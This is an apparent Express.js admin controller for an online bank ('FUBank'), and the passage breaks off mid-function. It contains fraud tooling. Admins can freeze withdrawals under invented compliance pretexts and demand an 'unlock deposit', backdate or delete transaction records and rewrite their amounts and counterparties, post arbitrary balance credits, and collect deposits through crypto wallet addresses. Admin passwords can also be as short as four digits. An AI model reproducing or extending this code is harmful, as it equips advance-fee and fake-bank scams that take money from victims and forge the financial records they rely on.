const Admin = require("../../models/admin/Admin");
const User = require("../../models/usermodels/userSignup");
const KYC = require("../../models/usermodels/kyc");
const Loan = require("../../models/usermodels/loans");
const Notification = require("../../models/usermodels/notifications");
const TransactionHistory = require("../../models/usermodels/transactionhistory");
const CryptoWallet = require("../../models/usermodels/cryptowallet");
const DepositRequest = require("../../models/usermodels/depositrequest");
const internationalTransferModel = require("../../models/usermodels/internationaltf");
const localTransferModel = require("../../models/usermodels/localtf");
const sendEmail = require("../../config/loanremindermailer");
const { getUserCurrency, getCurrencySymbol, getCurrencyFromCountry, formatUserBalance, SUPPORTED_CURRENCIES } = require("../../utils/currencyHelper");
const { body, validationResult } = require("express-validator");
const bcrypt = require("bcrypt");
const escape = require("escape-html");
const mongoose = require("mongoose");
const qrUpload = require("../../config/qruploads");
const path = require("path");
const fs = require("fs");
const multerLib = require("multer");

function handleQrUpload(req, res, next) {
  qrUpload.single("qrCode")(req, res, (err) => {
    if (err) {
      const msg =
        err instanceof multerLib.MulterError
          ? err.code === "LIMIT_FILE_SIZE"
            ? "QR image must be 2MB or smaller"
            : err.message
          : err.message || "QR upload failed";
      return res.status(400).json({ error: msg });
    }
    next();
  });
}

const TRANSACTION_BLOCK_REASONS = {
  fraud_investigation: {
    title: "Fraud Investigation",
    message:
      "Suspected unauthorized transactions, scams, or identity theft.",
  },
  transfer_limit_upgrade: {
    title: "Transfer-limit Upgrade",
    message:
      "Your transfer exceeds your current limit. Please request a transfer-limit upgrade",
  },
  account_upgrade: {
    title: "Account Upgrade",
    message:
      "Please upgrade your account to increase account limit and process higher transactions.",
  },
  dormant_account_reactivation: {
    title: "Dormant Account Reactivation Review",
    message:
      "Your account has had no recent activity for an extended period. Withdrawals are temporarily restricted while routine account reactivation checks are completed.",
  },
  kyc_documentation_update: {
    title: "KYC Documentation Update Required",
    message:
      "Withdrawals are temporarily restricted because your compliance records require an update. Please complete the required account verification review.",
  },
  unusual_activity_review: {
    title: "Unusual Transaction Pattern Review",
    message:
      "Withdrawals are temporarily restricted while recent transaction activity is reviewed as part of our fraud-prevention controls.",
  },
  regulatory_compliance_hold: {
    title: "Regulatory Compliance Hold",
    message:
      "Withdrawals are temporarily restricted while a mandatory regulatory compliance review is completed.",
  },
  security_verification_pending: {
    title: "Security Verification Pending",
    message:
      "Withdrawals are temporarily restricted until additional account security verification is completed.",
  },
  chargeback_dispute_review: {
    title: "Chargeback / Dispute Review",
    message:
      "Withdrawals are temporarily restricted while an active transaction dispute is being reviewed.",
  },
  deposit_exceeds_tier_limit: {
    title: "Deposit Exceeds Account Tier Limit",
    message:
      "A recent deposit amount exceeded your current account transaction limit. Withdrawals are temporarily restricted pending account tier review.",
  },
};

const TRANSACTION_BLOCK_REASON_OPTIONS = Object.entries(
  TRANSACTION_BLOCK_REASONS
).map(([code, details]) => ({
  code,
  title: details.title,
  message: details.message,
}));

const ACCOUNT_TIER_OPTIONS = {
  tier1: {
    key: "tier1",
    label: "Tier 1",
    perTransactionLimit: 5000,
    dailyLimit: 20000,
    isUnlimited: false,
  },
  tier2: {
    key: "tier2",
    label: "Tier 2",
    perTransactionLimit: 25000,
    dailyLimit: 100000,
    isUnlimited: false,
  },
  tier3: {
    key: "tier3",
    label: "Tier 3",
    perTransactionLimit: null,
    dailyLimit: null,
    isUnlimited: true,
  },
};

function getAccountTierConfig(tierKey) {
  return ACCOUNT_TIER_OPTIONS[tierKey] || ACCOUNT_TIER_OPTIONS.tier1;
}

// Admin Register
const registerAdmin = [
  body("email")
    .isEmail()
    .withMessage("Enter a valid email")
    .normalizeEmail()
    .trim(),
  body("name")
    .isLength({ min: 2 })
    .withMessage("Name must be at least 2 characters")
    .trim()
    .escape(),
  body("password")
    .isLength({ min: 4 })
    .withMessage("Password must be at least 4 digits")
    .isNumeric()
    .withMessage("Password must contain only numbers"),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    try {
      const { email, name, password } = req.body;

      const existingAdmin = await Admin.findOne({ email });
      if (existingAdmin) {
        return res.status(400).json({ error: "Email already in use" });
      }

      const hashedPassword = await bcrypt.hash(password, 10);
      const newAdmin = new Admin({
        email,
        name,
        password: hashedPassword,
        permissions: ["users", "kyc", "loans"],
      });

      await newAdmin.save();

      req.session.admin = {
        id: newAdmin._id,
        name: newAdmin.name,
        email: newAdmin.email,
        role: newAdmin.role,
      };

      res.status(201).json({ message: "Admin registered successfully" });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Server error" });
    }
  },
];

// Admin Login
const loginAdmin = [
  body("email")
    .isEmail()
    .withMessage("Enter a valid email")
    .normalizeEmail()
    .trim(),
  body("password")
    .isLength({ min: 4 })
    .withMessage("Password must be at least 4 characters"),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ error: errors.array()[0]?.msg || "Validation error", errors: errors.array() });
    }

    try {
      const { email, password } = req.body;

      const admin = await Admin.findOne({ email });
      if (!admin) {
        return res.status(401).json({ error: "Invalid credentials" });
      }

      const isMatch = await bcrypt.compare(password, admin.password);
      if (!isMatch) {
        return res.status(401).json({ error: "Invalid password" });
      }

      admin.lastLogin = new Date();
      await admin.save();

      req.session.admin = {
        id: admin._id,
        name: admin.name,
        email: admin.email,
        role: admin.role,
      };

      res.status(200).json({ message: "Login successful" });
    } catch (err) {
      console.error("Error in loginAdmin:", err);
      res.status(500).json({ error: "Server error" });
    }
  },
];

// Dashboard Stats
const getDashboardStats = async (req, res) => {
  try {
    const totalUsers = await User.countDocuments({ role: "user" });
    const pendingKYC = await KYC.countDocuments({ verified: false });
    const activeLoans = await Loan.countDocuments({ status: "approved" });
    const verifiedUsers = await KYC.countDocuments({ verified: true });

    res.render("admin/dashboard", {
      totalUsers,
      pendingKYC,
      activeLoans,
      verifiedUsers,
      admin: req.session.admin,
    });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

// Users List
const getUsers = async (req, res) => {
  try {
    const rawUsers = await User.find({ role: "user" })
      .select("Name Email AccountBalance AccountNumber currency isLoginBlocked status transactionLock accountTier createdAt")
      .lean();

    const userIds = rawUsers.map((u) => u._id);
    const kycs = await KYC.find({ userId: { $in: userIds } }).lean();
    const kycMap = new Map();
    kycs.forEach((k) => kycMap.set(String(k.userId), k));

    const users = rawUsers.map((u) => {
      const userKyc = kycMap.get(String(u._id)) || null;
      const currencyCode = getUserCurrency(u, userKyc);
      const currencySymbol = getCurrencySymbol(currencyCode);
      const formattedBalance = formatUserBalance(u.AccountBalance || 0, currencyCode);
      return {
        ...u,
        currencyCode,
        currencySymbol,
        formattedBalance,
      };
    });

    res.render("admin/users", { users, admin: req.session.admin });
  } catch (err) {
    console.error("Error in getUsers:", err);
    res.status(500).send("Server error");
  }
};

// User Details
const getUserDetails = async (req, res) => {
  try {
    const userId = req.params.id;
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).send("User not found");
    }
    const kyc = await KYC.findOne({ userId });
    const transactions = await TransactionHistory.find({ userId })
      .sort({ transactionDate: -1, createdAt: -1 })
      .limit(100)
      .lean();

    let displayDateOfBirth = "";
    if (kyc && kyc.dateOfBirth) {
      const dob = new Date(kyc.dateOfBirth);
      if (!Number.isNaN(dob.getTime())) {
        const yyyy = dob.getUTCFullYear();
        const mm = String(dob.getUTCMonth() + 1).padStart(2, "0");
        const dd = String(dob.getUTCDate()).padStart(2, "0");
        displayDateOfBirth = `${yyyy}-${mm}-${dd}`;
      }
    }

    const activeCurrency = getUserCurrency(user, kyc);
    const countryDefaultCurrency = getCurrencyFromCountry((kyc && kyc.country) || "");
    const currencySymbol = getCurrencySymbol(activeCurrency);

    res.render("admin/user-details", {
      user,
      kyc,
      transactions,
      accountTierOptions: Object.values(ACCOUNT_TIER_OPTIONS),
      currentTierConfig: getAccountTierConfig(user.accountTier),
      admin: req.session.admin,
      transactionBlockReasons: TRANSACTION_BLOCK_REASON_OPTIONS,
      displayPhone: user.Phone || (kyc && kyc.phoneNumber) || "",
      displayDateOfBirth,
      activeCurrency,
      countryDefaultCurrency,
      currencySymbol,
      supportedCurrencies: SUPPORTED_CURRENCIES,
    });
  } catch (err) {
    console.error("Error in getUserDetails:", err);
    res.status(500).send("Server error");
  }
};

// Delete User
const deleteUser = async (req, res) => {
  try {
    const userId = req.params.id;
    await User.findByIdAndDelete(userId);
    // Also delete related data if needed
    await KYC.findOneAndDelete({ userId });
    await Loan.deleteMany({ userId });
    res.redirect("/admin/users");
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

// Update Balance
const updateBalance = async (req, res) => {
  try {
    const { userId, action, amount } = req.body;
    console.log("Update balance request:", req.body);
    const amt = parseFloat(amount);
    if (isNaN(amt) || amt <= 0) {
      return res.status(400).json({ error: "Invalid amount" });
    }
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    const increment = action === "add" ? amt : -amt;
    await User.findByIdAndUpdate(userId, {
      $inc: { AccountBalance: increment },
    });

    // Record in transaction history
    const type = action === "add" ? "credit" : "debit";
    const description = action === "add" ? "Direct Deposit" : "Account Debit";
    const notifDescription =
      action === "add"
        ? `Your account has been credited with $${amt}`
        : `Your account has been debited with $${amt}`;
    await TransactionHistory.create({
      userId,
      type,
      amount: amt,
      description,
      status: "successful",
    });

    // Create notification
    await Notification.create({
      userId,
      type: "system_alert",
      message: notifDescription,
    });

    // Send email
    const subject = action === "add" ? "Account Credited" : "Account Debited";
    const text = description;
    const htmlContent = `<p>Dear ${user.Name},</p><p>${description}.</p><p>Thank you for banking with us.</p>`;
    sendEmail(user.Email, subject, text, htmlContent).catch(e => console.error("Email failed:", e.message));

    res.json({ message: "Balance updated successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
};

const updateUserDetails = async (req, res) => {
  try {
    const userId = req.params.id;
    const name = (req.body.Name || "").trim();
    const email = (req.body.Email || "").trim().toLowerCase();
    const phone = (req.body.Phone || "").trim();
    const dateOfBirthRaw = (req.body.dateOfBirth || "").trim();

    if (!name || name.length < 2) {
      return res.status(400).json({ error: "Name must be at least 2 characters." });
    }
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ error: "Please provide a valid email address." });
    }
    if (!phone || phone.length < 7) {
      return res.status(400).json({ error: "Please provide a valid phone number." });
    }

    let parsedDob = null;
    if (dateOfBirthRaw) {
      parsedDob = new Date(dateOfBirthRaw);
      if (Number.isNaN(parsedDob.getTime())) {
        return res.status(400).json({ error: "Invalid date of birth." });
      }
      if (parsedDob > new Date()) {
        return res.status(400).json({ error: "Date of birth cannot be in the future." });
      }
    }

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const emailTaken = await User.findOne({
      Email: email,
      _id: { $ne: userId },
    }).select("_id");
    if (emailTaken) {
      return res.status(400).json({ error: "That email is already in use by another account." });
    }

    const creditScoreRaw = req.body.CreditScore !== undefined ? req.body.CreditScore : req.body.creditScore;
    let parsedCreditScore = null;
    if (creditScoreRaw !== undefined && creditScoreRaw !== "") {
      parsedCreditScore = parseInt(creditScoreRaw, 10);
      if (isNaN(parsedCreditScore) || parsedCreditScore < 300 || parsedCreditScore > 900) {
        return res.status(400).json({ error: "Credit Score must be a valid number between 300 and 900." });
      }
    }

    user.Name = escape(name);
    user.Email = escape(email);
    user.Phone = escape(phone);
    if (parsedCreditScore !== null) {
      user.CreditScore = parsedCreditScore;
    }
    if (req.body.status && ["active", "inactive", "blocked", "on hold"].includes(req.body.status)) {
      user.status = req.body.status;
      if (req.body.status === "blocked") {
        user.loginBlocked = true;
      } else if (req.body.status === "active") {
        user.loginBlocked = false;
        if (user.transactionLock) {
          user.transactionLock.isBlocked = false;
        }
      } else if (req.body.status === "on hold") {
        if (!user.transactionLock) {
          user.transactionLock = {};
        }
        user.transactionLock.isBlocked = true;
      } else if (req.body.status === "inactive") {
        user.loginBlocked = false;
      }
    }
    await user.save();

    const kyc = await KYC.findOne({ userId });
    if (kyc) {
      if (!parsedDob) {
        return res.status(400).json({ error: "Please provide a date of birth." });
      }
      kyc.phoneNumber = escape(phone);
      kyc.dateOfBirth = parsedDob;
      await kyc.save();
    }

    await Notification.create({
      userId: user._id,
      type: "info",
      message: "Your account details were updated by support.",
    });

    return res.json({ message: "User details updated successfully." });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Server error" });
  }
};

const updateUserLoginBlock = async (req, res) => {
  try {
    const userId = req.params.id;
    const loginBlocked = req.body.loginBlocked === true || req.body.loginBlocked === "true";

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.loginBlocked = loginBlocked;
    await user.save();

    await Notification.create({
      userId: user._id,
      type: "warning",
      message: loginBlocked
        ? "Your login access has been blocked. Please contact support."
        : "Your login access has been restored.",
    });

    return res.json({
      message: loginBlocked
        ? "User login has been blocked."
        : "User login has been unblocked.",
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Server error" });
  }
};

const updateUserAccountTier = async (req, res) => {
  try {
    const userId = req.params.id;
    const tier = (req.body.accountTier || "").trim().toLowerCase();

    if (!ACCOUNT_TIER_OPTIONS[tier]) {
      return res.status(400).json({ error: "Invalid account tier selected." });
    }

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    user.accountTier = tier;
    await user.save();

    const tierConfig = getAccountTierConfig(tier);
    const tierMessage = tierConfig.isUnlimited
      ? `${tierConfig.label} (Unlimited)`
      : `${tierConfig.label}: $${tierConfig.perTransactionLimit.toLocaleString()} per transaction, $${tierConfig.dailyLimit.toLocaleString()} daily`;

    await Notification.create({
      userId: user._id,
      type: "info",
      message: `Your account tier was updated by an administrator to ${tierMessage}.`,
    });

    return res.json({ message: "Account tier updated successfully." });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Server error" });
  }
};


const updateUserCurrency = async (req, res) => {
  try {
    const userId = req.params.id;
    const { currency } = req.body;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const cleanCurrency = String(currency || "").trim().toUpperCase();
    user.currency = (cleanCurrency === "COUNTRY_DEFAULT" || cleanCurrency === "") ? "" : cleanCurrency;
    await user.save();

    const kyc = await KYC.findOne({ userId });
    const activeCurrency = getUserCurrency(user, kyc);

    await Notification.create({
      userId: user._id,
      type: "info",
      message: `Your account display currency has been updated to ${activeCurrency}.`,
    });

    return res.json({
      message: "Account currency updated successfully.",
      currency: user.currency || "COUNTRY_DEFAULT",
      activeCurrency,
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Server error" });
  }
};

const updateTransactionLock = async (req, res) => {
  try {
    const userId = req.params.id;
    const user = await User.findById(userId);

    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const isBlocked = req.body.isBlocked === true || req.body.isBlocked === "true";

    if (!isBlocked) {
      user.transactionLock = {
        isBlocked: false,
        reasonCode: "",
        reasonTitle: "",
        reasonMessage: "",
        unlockDepositAmount: 0,
        blockedAt: null,
        blockedByAdminId: null,
        blockedByAdminName: "",
      };
      await user.save();

      await Notification.create({
        userId: user._id,
        type: "success",
        message:
          "Your account withdrawal restriction has been removed. You can now withdraw funds normally.",
      });

      return res.json({ message: "Transaction block removed successfully." });
    }

    const reasonCode = (req.body.reasonCode || "").trim();
    const reason = TRANSACTION_BLOCK_REASONS[reasonCode];

    if (!reason) {
      return res.status(400).json({ error: "Please select a valid block reason." });
    }

    const unlockDepositAmount = parseFloat(req.body.unlockDepositAmount);
    if (isNaN(unlockDepositAmount) || unlockDepositAmount <= 0) {
      return res
        .status(400)
        .json({ error: "Unlock deposit amount must be greater than zero." });
    }

    const adminNote = req.body.adminNote ? escape(req.body.adminNote.trim()) : "";
    const reasonMessage = adminNote
      ? `${reason.message} ${adminNote}`
      : reason.message;

    user.transactionLock = {
      isBlocked: true,
      reasonCode,
      reasonTitle: reason.title,
      reasonMessage,
      unlockDepositAmount,
      blockedAt: new Date(),
      blockedByAdminId: req.session.admin?.id || null,
      blockedByAdminName: req.session.admin?.name || "",
    };
    await user.save();

    await Notification.create({
      userId: user._id,
      type: "warning",
      message: `${reason.title}: ${reasonMessage} To unlock withdrawals, make a deposit of at least $${unlockDepositAmount.toFixed(
        2
      )}. This deposit remains your money and stays available in your account.`,
    });

    return res.json({ message: "Transaction block updated successfully." });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Server error" });
  }
};

const backdateUserTransaction = async (req, res) => {
  try {
    const { id: userId, transactionId } = req.params;
    const {
      backdatedAt,
      bankName,
      personName,
      relatedFullName,
      accountNumber,
      relatedAccount,
      description,
      message,
      type,
      amount,
      status,
    } = req.body;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }

    const transaction = await TransactionHistory.findOne({
      _id: transactionId,
      userId,
    });

    if (!transaction) {
      return res.status(404).json({ error: "Transaction not found for this user." });
    }

    const updateFields = {};

    if (backdatedAt && typeof backdatedAt === "string") {
      const parsedDate = new Date(backdatedAt);
      if (Number.isNaN(parsedDate.getTime())) {
        return res.status(400).json({ error: "Invalid date format." });
      }

      if (parsedDate > new Date()) {
        return res.status(400).json({ error: "Backdated value cannot be in the future." });
      }

      updateFields.transactionDate = parsedDate;
      updateFields.createdAt = parsedDate;
      updateFields.updatedAt = parsedDate;
    }

    if (type && ["credit", "debit"].includes(String(type).toLowerCase())) {
      updateFields.type = String(type).toLowerCase();
    }

    if (amount !== undefined && amount !== "") {
      const parsedAmt = parseFloat(amount);
      if (!isNaN(parsedAmt) && parsedAmt > 0) {
        updateFields.amount = parsedAmt;
      }
    }

    const nameToUpdate = personName !== undefined ? personName : relatedFullName;
    if (nameToUpdate !== undefined) {
      updateFields.relatedFullName = String(nameToUpdate).trim();
    }

    const accToUpdate = accountNumber !== undefined ? accountNumber : relatedAccount;
    if (accToUpdate !== undefined) {
      updateFields.relatedAccount = String(accToUpdate).trim();
    }

    if (bankName !== undefined) {
      updateFields.bankName = String(bankName).trim();
    }

    let statusUpdated = false;
    if (status && typeof status === "string") {
      const validStatuses = [
        "pending",
        "successful",
        "completed",
        "on hold",
        "on-hold",
        "reversed",
        "failed",
      ];
      let normalizedStatus = status.trim().toLowerCase();
      if (normalizedStatus === "on-hold") normalizedStatus = "on hold";

      if (validStatuses.includes(normalizedStatus)) {
        const previousStatus = (transaction.status || "").toLowerCase();
        if (normalizedStatus !== previousStatus) {
          updateFields.status = normalizedStatus;
          statusUpdated = true;

          // Reversal refund logic:
          const refundAmt = Number(updateFields.amount !== undefined ? updateFields.amount : transaction.amount);
          if (normalizedStatus === "reversed" && previousStatus !== "reversed") {
            if (transaction.type === "debit" && !Number.isNaN(refundAmt) && refundAmt > 0) {
              await User.findByIdAndUpdate(userId, {
                $inc: { AccountBalance: refundAmt },
              });
            }
          } else if (previousStatus === "reversed" && normalizedStatus !== "reversed") {
            if (transaction.type === "debit" && !Number.isNaN(refundAmt) && refundAmt > 0) {
              await User.findByIdAndUpdate(userId, {
                $inc: { AccountBalance: -refundAmt },
              });
            }
          }

          // Create in-app popup notifications for the user
          const recipientName =
            updateFields.relatedFullName ||
            transaction.relatedFullName ||
            transaction.relatedAccount ||
            "recipient";
          const formattedAmount = `${Number(transaction.amount || 0).toLocaleString(
            "en-US",
            { minimumFractionDigits: 2, maximumFractionDigits: 2 }
          )}`;

          if (normalizedStatus === "successful" || normalizedStatus === "completed") {
            await Notification.create({
              userId: user._id,
              type: "success",
              title: "Transfer Completed",
              statusType: "successful",
              message: `Your transfer of ${formattedAmount} to ${recipientName} has been processed successfully.`,
              popupDismissed: false,
              relatedReferenceId: transaction.referenceId || null,
            });
          } else if (normalizedStatus === "on hold") {
            await Notification.create({
              userId: user._id,
              type: "warning",
              title: "Transfer On Hold",
              statusType: "on_hold",
              message: `Your transfer of ${formattedAmount} to ${recipientName} is currently on hold. Please check your account or contact support.`,
              popupDismissed: false,
              relatedReferenceId: transaction.referenceId || null,
            });
          } else if (normalizedStatus === "reversed") {
            await Notification.create({
              userId: user._id,
              type: "info",
              title: "Transfer Reversed",
              statusType: "reversed",
              message: `Your transfer of ${formattedAmount} to ${recipientName} has been reversed. The funds have been refunded to your account balance.`,
              popupDismissed: false,
              relatedReferenceId: transaction.referenceId || null,
            });
          }

          // Sync underlying transfer model if present
          if (transaction.transferId || transaction.referenceId) {
            const query = transaction.transferId
              ? { _id: transaction.transferId }
              : { ReferenceId: transaction.referenceId };
            await Promise.all([
              internationalTransferModel
                .updateOne(query, { $set: { status: normalizedStatus } })
                .catch(() => {}),
              localTransferModel
                .updateOne(query, { $set: { status: normalizedStatus } })
                .catch(() => {}),
            ]);
          }

          // Send status update email to user (asynchronous & non-blocking)
          try {
            const userToNotify = await User.findById(userId).lean();
            if (userToNotify && userToNotify.Email) {
              const txPlain = transaction ? (typeof transaction.toObject === "function" ? transaction.toObject() : transaction) : {};
              sendTransactionStatusUpdateEmail({
                user: userToNotify,
                transaction: { ...txPlain, ...updateFields },
                newStatus: normalizedStatus,
                previousStatus,
              }).catch((err) => console.error("❌ Failed to send status update email:", err));
            }
          } catch (mailErr) {
            console.error("❌ Error preparing status update email:", mailErr);
          }
        }
      }
    }

    if (Object.keys(updateFields).length === 0) {
      return res.status(400).json({ error: "No update values provided." });
    }

    await TransactionHistory.collection.updateOne(
      { _id: transaction._id },
      {
        $set: updateFields,
      }
    );

    return res.json({
      message: "Transaction updated successfully.",
      ...updateFields,
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: "Server error" });
  }
};

const deleteUserTransaction = async (req, res) => {
  try {
    const { id: userId, transactionId } = req.params;

    const user = await User.findById(userId).select("_id");
    if (!user) {
      return res.status(404).json({ error: "User not found." });
    }

    const transaction = await TransactionHistory.findOneAndDelete({
      _id: transactionId,
      userId,
    });

    if (!transaction) {
      return res
        .status(404)
        .json({ error: "Transaction not found for this user." });
    }

    return res.json({
      message: "Transaction deleted successfully.",
      transactionId,
    });
  } catch (err) {
    console.error("Error deleting user transaction:", err);
    return res
      .status(500)
      .json({ error: "Server error while deleting transaction." });
  }
};

// KYC List
const getKYCs = async (req, res) => {
  try {
    const kycs = await KYC.find({ verified: false }).populate(
      "userId",
      "Name Email"
    );
    res.render("admin/kyc", { kycs, admin: req.session.admin });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

// KYC Details
const getKYCDetails = async (req, res) => {
  try {
    const kycId = req.params.id;
    const kyc = await KYC.findById(kycId).populate("userId");
    if (!kyc) {
      return res.status(404).send("KYC not found");
    }
    res.render("admin/kyc-details", { kyc, admin: req.session.admin });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

// Approve KYC
const approveKYC = async (req, res) => {
  try {
    const kycId = req.params.id;
    await KYC.findByIdAndUpdate(kycId, { verified: true });
    res.json({ message: "KYC approved" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
};

// Decline KYC
const declineKYC = async (req, res) => {
  try {
    const kycId = req.params.id;
    // For simplicity, delete or set verified: false
    await KYC.findByIdAndDelete(kycId);
    res.json({ message: "KYC declined" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
};

// Loans List
const getLoans = async (req, res) => {
  try {
    const loans = await Loan.find().populate("userId", "Name Email");
    res.render("admin/loans", { loans, admin: req.session.admin });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

// Loan Details
const getLoanDetails = async (req, res) => {
  try {
    const loanId = req.params.id;
    const loan = await Loan.findById(loanId).populate("userId");
    if (!loan) {
      return res.status(404).send("Loan not found");
    }
    res.render("admin/loan-details", { loan, admin: req.session.admin });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

// Mark Loan as Paid
const markLoanAsPaid = async (req, res) => {
  try {
    const loanId = req.params.id;
    const loan = await Loan.findById(loanId).populate("userId");
    
    if (!loan) {
      return res.status(404).json({ error: "Loan not found" });
    }

    if (loan.status === "repaid") {
      return res.status(400).json({ error: "Loan is already marked as paid" });
    }

    // Update loan status
    loan.status = "repaid";
    loan.interestPaid = loan.amount * (loan.interestRate / 100);
    loan.principalPaid = loan.amount;
    await loan.save();

    // Update user credit score if not already updated
    const user = await User.findById(loan.userId._id);
    if (user) {
      const oldScore = user.CreditScore;
      user.CreditScore = Math.min(user.CreditScore + 10, 900);
      await user.save();

      // Create notification
      const paidMessage = `Your loan of $${loan.amount} has been marked as fully paid by the administrator. Your credit score has been increased by 10 points.`;
      await Notification.create({
        userId: user._id,
        type: "success",
        message: paidMessage,
        relatedEntity: loan._id,
        read: false,
      });

      // Send email notification
      const subject = "Loan Marked as Paid - Congratulations!";
      const text = paidMessage;
      const htmlContent = `
        <p style="font-size: 16px; color: #374151;">Dear <strong>${user.Name}</strong>,</p>
        <p style="font-size: 15px; color: #374151;">
          We are pleased to inform you that your loan has been marked as fully paid by the administrator.
        </p>
        <div style="background-color: #f0fdf4; padding: 15px; border-radius: 6px; margin: 20px 0; border-left: 4px solid #10b981;">
          <p style="margin: 0; font-size: 14px; color: #059669;"><strong>Loan Details:</strong></p>
          <p style="margin: 5px 0; font-size: 14px; color: #374151;">Loan Amount: <strong>$${loan.amount.toFixed(2)}</strong></p>
          <p style="margin: 5px 0; font-size: 14px; color: #374151;">Interest Rate: <strong>${loan.interestRate}%</strong></p>
          <p style="margin: 5px 0; font-size: 14px; color: #059669;">Status: <strong>Fully Paid</strong></p>
          <p style="margin: 5px 0; font-size: 14px; color: #059669;">Credit Score Bonus: <strong>+10 points</strong></p>
        </div>
        <p style="font-size: 15px; color: #374151;">
          Thank you for your timely payment. Your credit score has been increased as a reward for completing your loan repayment.
        </p>
        <p style="margin-top: 20px; font-size: 14px; color: #111827;">
          Thank you for banking with us.<br><strong>FUBank Team</strong>
        </p>
      `;
      sendEmail(user.Email, subject, text, htmlContent).catch(e => console.error("Email failed:", e.message));
    }

    res.json({ message: "Loan marked as paid successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
};

// Crypto Wallet Management
const getCryptoWallets = async (req, res) => {
  try {
    const wallets = await CryptoWallet.find().sort({ createdAt: -1 }).lean();
    res.render("admin/crypto-wallets", { wallets, admin: req.session.admin });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
};

const createCryptoWallet = [
  handleQrUpload,
  body("walletName")
    .isLength({ min: 2 })
    .withMessage("Wallet name must be at least 2 characters")
    .trim()
    .escape(),
  body("walletAddress")
    .isLength({ min: 10 })
    .withMessage("Wallet address must be at least 10 characters")
    .trim()
    .escape(),
  body("cryptocurrency")
    .isIn(["BTC", "ETH", "USDT", "USDC", "BNB", "SOL", "XRP", "DOGE", "ADA", "DOT", "MATIC", "LTC", "TRX", "BCH", "XLM", "Other"])
    .withMessage("Invalid cryptocurrency"),
  body("network")
    .isIn(["Bitcoin", "Ethereum", "Binance Smart Chain", "Polygon", "Solana", "Tron", "Litecoin", "Bitcoin Cash", "Stellar", "Other"])
    .withMessage("Invalid network"),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    try {
      const { walletName, walletAddress, cryptocurrency, network } = req.body;
      
      // Handle QR code file upload
      let qrCodeUrl = "";
      if (req.file) {
        qrCodeUrl = `/uploads/qrcodes/${req.file.filename}`;
      }

      const newWallet = new CryptoWallet({
        walletName: escape(walletName),
        walletAddress: escape(walletAddress),
        cryptocurrency,
        network,
        qrCode: qrCodeUrl,
        isActive: true,
      });

      await newWallet.save();
      res.json({ message: "Crypto wallet created successfully", wallet: newWallet });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Server error" });
    }
  },
];

const updateCryptoWallet = [
  handleQrUpload,
  body("walletName")
    .optional()
    .isLength({ min: 2 })
    .withMessage("Wallet name must be at least 2 characters")
    .trim()
    .escape(),
  body("walletAddress")
    .optional()
    .isLength({ min: 10 })
    .withMessage("Wallet address must be at least 10 characters")
    .trim()
    .escape(),

  async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }

    try {
      const walletId = req.params.id;
      const { walletName, walletAddress, cryptocurrency, network, isActive } = req.body;

      const updateData = {};
      if (walletName) updateData.walletName = escape(walletName);
      if (walletAddress) updateData.walletAddress = escape(walletAddress);
      if (cryptocurrency) updateData.cryptocurrency = cryptocurrency;
      if (network) updateData.network = network;
      
      // Handle QR code file upload - only update if new file is uploaded
      if (req.file) {
        const existingWallet = await CryptoWallet.findById(walletId);
        if (existingWallet && existingWallet.qrCode) {
          const rel = existingWallet.qrCode.replace(/^\//, "");
          const oldFilePath = path.join(__dirname, "../..", rel);
          if (fs.existsSync(oldFilePath)) {
            fs.unlinkSync(oldFilePath);
          }
        }
        updateData.qrCode = `/uploads/qrcodes/${req.file.filename}`;
      }
      
      if (isActive !== undefined) updateData.isActive = isActive === "true" || isActive === true;

      const wallet = await CryptoWallet.findByIdAndUpdate(walletId, updateData, { new: true });
      if (!wallet) {
        return res.status(404).json({ error: "Wallet not found" });
      }

      res.json({ message: "Crypto wallet updated successfully", wallet });
    } catch (err) {
      console.error(err);
      res.status(500).json({ error: "Server error" });
    }
  },
];

const deleteCryptoWallet = async (req, res) => {
  try {
    const walletId = req.params.id;
    await CryptoWallet.findByIdAndDelete(walletId);
    res.json({ message: "Crypto wallet deleted successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
};

// Deposit Request Management
const getDepositRequests = async (req, res) => {
  try {
    const depositRequests = await DepositRequest.find()
